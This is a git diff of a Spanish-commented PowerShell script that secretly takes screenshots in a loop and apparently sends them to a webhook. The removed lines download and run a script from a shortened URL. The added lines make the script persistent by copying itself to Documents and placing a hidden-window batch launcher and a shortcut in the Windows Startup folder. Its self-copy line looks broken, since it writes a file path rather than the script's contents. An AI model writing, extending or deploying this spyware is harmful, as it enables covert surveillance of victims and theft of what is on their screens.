@@ -11,9 +11,12 @@ if ($hookurl.Ln -ne 121){
 
 # Bucle principal: tomar dos capturas de pantalla cada 30 segundos
 While ($true){
-    # Definir la ruta y el nombre de archivo para la captura de pantalla
-    $file1 = "$env:temp\SC1.png"
-    $file2 = "$env:temp\SC2.png"
+    # Obtener la fecha y hora actual
+    $dateTime = Get-Date -Format "yyyyMMdd-HHmmss"
+    
+    # Definir la ruta y el nombre de archivo para la captura de pantalla con fecha y hora
+    $file1 = "$env:temp\SC1_$dateTime.png"
+    $file2 = "$env:temp\SC2_$dateTime.png"
     
     # Tomar la primera captura de pantalla
     Add-Type -AssemblyName System.Windows.Forms
@@ -44,20 +47,33 @@ While ($true){
     Remove-Item -Path $file1
     Remove-Item -Path $file2
     
-    # Descargar el script de capturas de pantalla para webhook y guardarlo como "sysw.ps1" en la carpeta de documentos
-    $scriptURL = "https://is.gd/H8uBqE"
-    $scriptPath = Join-Path -Path $env:USERPROFILE -ChildPath "Documents\sysw.ps1"
-    Invoke-WebRequest -Uri $scriptURL -OutFile $scriptPath
-    
-    # Ejecutar el script de capturas de pantalla para webhook al iniciar Windows
-    $startupFolder = [Environment]::GetFolderPath("Startup")
-    $batFilePath = Join-Path -Path $startupFolder -ChildPath "Run_Script.lnk"
-    $batContent = @"
-@echo off
-powershell.exe -WindowStyle Hidden -File "$scriptPath"
-"@
-    Set-Content -Path $batFilePath -Value $batContent
-
     # Esperar el intervalo de tiempo especificado antes de tomar las próximas capturas de pantalla
     Start-Sleep -Seconds $seconds
 }
+
+# Obtener la carpeta de documentos del usuario actual
+$documentsFolder = [Environment]::GetFolderPath("MyDocuments")
+
+# Ruta completa del archivo de script en la carpeta de documentos
+$scriptPath = Join-Path -Path $documentsFolder -ChildPath "sys2.ps1"
+
+# Guardar el script en la carpeta de documentos
+Set-Content -Path $scriptPath -Value $ExecutionContext.SessionState.InvokeCommand.ExpandString(($MyInvocation.MyCommand.ScriptBlock).File)
+
+# Guardar el archivo de lote para ejecutar el script al iniciar Windows
+$batFilePath = Join-Path -Path $documentsFolder -ChildPath "run_script.bat"
+$batContent = @"
+@echo off
+powershell.exe -WindowStyle Hidden -File "$scriptPath"
+"@
+Set-Content -Path $batFilePath -Value $batContent
+
+# Obtener la carpeta de inicio del usuario actual
+$startupFolder = [Environment]::GetFolderPath("Startup")
+
+# Crear un acceso directo del archivo de lote en la carpeta de inicio para que se ejecute al iniciar Windows
+$shortcutPath = Join-Path -Path $startupFolder -ChildPath "Run_Script.lnk"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+$Shortcut.TargetPath = $batFilePath
+$Shortcut.Save()
